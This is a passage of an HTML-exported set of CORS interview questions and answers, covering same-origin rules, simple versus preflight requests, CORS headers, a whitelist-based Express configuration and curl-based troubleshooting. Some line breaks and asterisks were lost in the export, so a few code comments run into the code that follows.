referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-808a-8447-c6747d6a945e" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">✅ https://example.com/page1
✅ https://example.com/page2
✅ https://example.com:443/api
// All same origin (port 443 is default for HTTPS)</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8088-8b5a-ca965d085713" class=""><strong>Different Origin Examples:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8043-8650-e12e8e229ff8" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">❌ http://example.com vs https://example.com
   (Different protocol)

❌ example.com vs www.example.com
   (Different host)

❌ https://example.com vs https://example.com:8080
   (Different port)

❌ https://example.com vs https://api.example.com
   (Different subdomain)</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-804a-9b25-c38229d0535a" class=""><strong>Note:</strong><br/>- <code>www.google.com</code> and <code>google.com</code> are <strong>different origins</strong> (different hosts)<br/>- <code>http://google.com</code> and <code>https://google.com</code> are <strong>different origins</strong> (different protocols)</p></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8069-b24e-f938e06db9b8"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80da-9eea-eb13718385f9" class="">Q4: What is the difference between simple requests and preflight requests?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8024-aa22-c87cc87d461c" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-805d-a20b-e9e877de89ae" class=""><strong>Simple Requests:</strong><br/>- Sent directly without preflight check<br/>- Must meet specific criteria:<br/>- Method: GET, POST, or HEAD<br/>- Headers: Only simple headers (Accept, Accept-Language, Content-Language)<br/>- Content-Type: <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80e4-a3b9-eac12f53f77a" class=""><strong>Preflight Requests:</strong><br/>- Browser sends OPTIONS request first<br/>- Triggered when:<br/>- Custom headers (e.g., <code>X-Custom-Header</code>)<br/>- Non-simple methods (PUT, DELETE, PATCH)<br/>- Content-Type other than simple types (e.g., <code>application/json</code>)<br/>- Requests with credentials (in some cases)</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-800c-a014-e27bdaf4e07c" class=""><strong>Example Simple Request:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-806b-8ac0-d71acd879615" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Simple GET request - no preflightfetch(&#x27;https://api.example.com/data&#x27;)
  .then(response =&gt; response.json());</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80c2-a23a-e3d3918cda3e" class=""><strong>Example Preflight Request:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8043-8974-f8d7faf71b59" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Triggers preflight (custom header + JSON)fetch(&#x27;https://api.example.com/data&#x27;, {
  method: &#x27;POST&#x27;,  headers: {
    &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,    &#x27;X-Custom-Header&#x27;: &#x27;value&#x27;  },  body: JSON.stringify({key: &#x27;value&#x27;})
});// Flow:// 1. Browser sends OPTIONS (preflight)// 2. Server responds with CORS headers// 3. Browser checks response// 4. If allowed → Sends actual POST request// 5. If not allowed → Blocks request</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8031-bbfe-e40c713c3cd6"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-807e-a0d4-f4b765c086ab" class="">Q5: What are the main CORS headers and what do they do?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8004-a5d3-fa8783978d73" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-803a-ae2c-d8314c4ae7a5" class=""><strong>Request Headers (Sent by Browser):</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-807a-9394-dfb9164caa3d" class="numbered-list" start="1"><li><strong>Origin</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8065-85d4-f751013e334f" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Origin: https://example.com</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-802d-8525-da38f7ce158e" class="bulleted-list"><li style="list-style-type:disc">Automatically set by browser</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-804c-bcef-f2c9e6915799" class="bulleted-list"><li style="list-style-type:disc">Cannot be modified by JavaScript</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8039-8eb7-f0a8d28bdcd1" class="bulleted-list"><li style="list-style-type:disc">Indicates the origin of the requesting page</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-806c-96f2-c5f2bdf0ff95" class="numbered-list" start="2"><li><strong>Access-Control-Request-Method</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8055-b9d8-fc8e5b6b97a2" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Request-Method: POST</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-809f-80b8-dd3e489d107d" class="bulleted-list"><li style="list-style-type:disc">Used in preflight requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-803c-bc7c-cb770dd7cae1" class="bulleted-list"><li style="list-style-type:disc">Indicates the HTTP method of the actual request</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-802d-9132-c29a7758a7ef" class="numbered-list" start="3"><li><strong>Access-Control-Request-Headers</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80ba-b5a8-dc308c451901" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Request-Headers: X-Custom-Header, Content-Type</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8095-a620-f1f6211d38b6" class="bulleted-list"><li style="list-style-type:disc">Used in preflight requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8006-a453-e6d096bf0294" class="bulleted-list"><li style="list-style-type:disc">Lists custom headers that will be sent</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-807e-88b6-d198c63e94d0" class=""><strong>Response Headers (Sent by Server):</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-803c-ae37-ea22b03d535b" class="numbered-list" start="1"><li><strong>Access-Control-Allow-Origin</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-801c-bf38-d28c409eb8f8" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin: https://example.com</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-802d-8c2d-e1187bc63cdf" class="bulleted-list"><li style="list-style-type:disc">Most important CORS header</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-807b-880a-d98fa1e1f7fd" class="bulleted-list"><li style="list-style-type:disc">Specifies which origin(s) can access the resource</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8079-b450-fba469d1372a" class="bulleted-list"><li style="list-style-type:disc">Can be specific origin or  (wildcard)</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8095-b8f3-fb91e28f1523" class="numbered-list" start="2"><li><strong>Access-Control-Allow-Methods</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80a5-a9ed-c3d89c9b5aa4" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Methods: GET, POST, PUT, DELETE</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80c8-b63b-d63688aa12b9" class="bulleted-list"><li style="list-style-type:disc">Specifies which HTTP methods are allowed</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-804d-9262-e91a57b4e299" class="bulleted-list"><li style="list-style-type:disc">Used in preflight responses</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-801a-ac17-c13605da095f" class="numbered-list" start="3"><li><strong>Access-Control-Allow-Headers</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80c2-be8a-ef77cfbecfc4" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Headers: Content-Type, Authorization</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80e5-8049-f360ecce34d0" class="bulleted-list"><li style="list-style-type:disc">Specifies which request headers are allowed</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8003-9487-d8a274ed3c3d" class="bulleted-list"><li style="list-style-type:disc">Used in preflight responses</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8092-9ea5-eff56a6a94d7" class="numbered-list" start="4"><li><strong>Access-Control-Allow-Credentials</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80e9-af96-e8c666eff1f9" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Credentials: true</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8050-87ec-cb5eb2f0d508" class="bulleted-list"><li style="list-style-type:disc">Indicates whether credentials can be sent</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80a6-9d3c-d4f698be2763" class="bulleted-list"><li style="list-style-type:disc"><strong>Cannot use wildcard () with credentials</strong></li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80ef-a310-ce9a3f2da031" class="numbered-list" start="5"><li><strong>Access-Control-Expose-Headers</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-806c-8b0c-f0776b6fe514" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Expose-Headers: X-Custom-Header</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-800c-a4de-ec2476ac478a" class="bulleted-list"><li style="list-style-type:disc">Specifies which response headers can be accessed by JavaScript</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-800a-8dba-f3a14d41007e" class="numbered-list" start="6"><li><strong>Access-Control-Max-Age</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8065-a607-d586664fa9a6" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Max-Age: 86400</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-807f-9241-c0cd188895c4" class="bulleted-list"><li style="list-style-type:disc">Specifies how long preflight results can be cached (in seconds)</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8009-aa98-f88c878de874"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-80bf-ac1d-e059585fe834" class="">Scenario-Based Questions</h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80d0-917b-ca165a56b795" class="">Q6: How would you configure CORS to allow a trusted third-party domain to access your API while ensuring security?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8097-a072-eb4f139d2790" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80c1-b8a6-d442900f049a" class=""><strong>Secure Configuration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-809a-a3dc-fb8ae72df37c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const allowedOrigins = [
  &#x27;https://trusted-partner.com&#x27;,  &#x27;https://app.trusted-partner.com&#x27;];app.use((req, res, next) =&gt; {
  const origin = req.headers.origin;  // Validate origin against whitelist  if (allowedOrigins.includes(origin)) {
    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);    res.setHeader(&#x27;Access-Control-Allow-Credentials&#x27;, &#x27;true&#x27;);    res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;, &#x27;GET, POST&#x27;);    res.setHeader(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;Content-Type, Authorization&#x27;);    res.setHeader(&#x27;Access-Control-Max-Age&#x27;, &#x27;86400&#x27;);  }
  // Handle preflight  if (req.method === &#x27;OPTIONS&#x27;) {
    return res.sendStatus(200);  }
  next();});</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-802b-822b-f292af112701" class=""><strong>Key Security Points:</strong><br/>1. <strong>Whitelist specific origins</strong> - Don’t use wildcard<br/>2. <strong>Validate Origin header</strong> - Don’t blindly reflect it<br/>3. <strong>Limit methods and headers</strong> - Only allow what’s needed<br/>4. <strong>Use credentials carefully</strong> - Only if necessary<br/>5. <strong>Handle preflight properly</strong> - Validate preflight requests</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80cd-abe2-ce09769d54be" class=""><strong>Alternative (Using cors middleware):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80c4-b5f9-d2fe624a9ce9" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const cors = require(&#x27;cors&#x27;);const corsOptions = {
  origin: (origin, callback) =&gt; {
    const allowedOrigins = [
      &#x27;https://trusted-partner.com&#x27;,      &#x27;https://app.trusted-partner.com&#x27;    ];    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);    } else {
      callback(new Error(&#x27;Not allowed by CORS&#x27;));    }
  },  credentials: true,  methods: [&#x27;GET&#x27;, &#x27;POST&#x27;],  allowedHeaders: [&#x27;Content-Type&#x27;, &#x27;Authorization&#x27;],  maxAge: 86400};app.use(cors(corsOptions));</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80a7-9028-e4153e5a679b"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-805d-b0e1-e1da1ead03b8" class="">Q7: A user reports that their application can’t make requests to your API. How do you troubleshoot CORS issues?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-809c-95ed-c00b05002fd7" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80b1-87a6-e7974b59b458" class=""><strong>Troubleshooting Steps:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80bc-8567-e06c0b02ed24" class="numbered-list" start="1"><li><strong>Check Browser Console:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-809d-955f-dff430008edf" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Look for CORS errors// &quot;No &#x27;Access-Control-Allow-Origin&#x27; header&quot;// &quot;CORS policy blocked&quot;</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80b1-ad92-f623838a1f41" class="numbered-list" start="2"><li><strong>Check Request Headers:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8071-8397-e0f4af85b031" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Verify Origin header is sent
Origin: https://example.com</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8056-a915-c1384ad2fdc2" class="numbered-list" start="3"><li><strong>Check Response Headers:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-802c-9d78-c8ad3a6f874d" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Verify CORS headers are present
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-805c-bcfc-e949d1666bff" class="numbered-list" start="4"><li><strong>Test with curl:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8098-9987-ce6d87705f08" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Test simple requestcurl -H &quot;Origin: https://example.com&quot; \     -v https://api.example.com/data
# Test preflightcurl -X OPTIONS \     -H &quot;Origin: https://example.com&quot; \     -H &quot;Access-Control-Request-Method: POST&quot; \     -v https://api.example.com/data</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8020-81f6-fb58f011e13d" class="numbered-list" start="5"><li><strong>Common Issues:</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-805b-8937-c0af72e2e21a" class="bulleted-list"><li style="list-style-type:disc"><strong>Missing CORS headers</strong> - Server not sending CORS headers</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8063-a8e8-fda61bff259c" class="bulleted-list"><li style="list-style-type:disc"><strong>Origin mismatch</strong> - Origin not in allowed list</li></ul></div><div style="display:contents" dir="auto"><ul 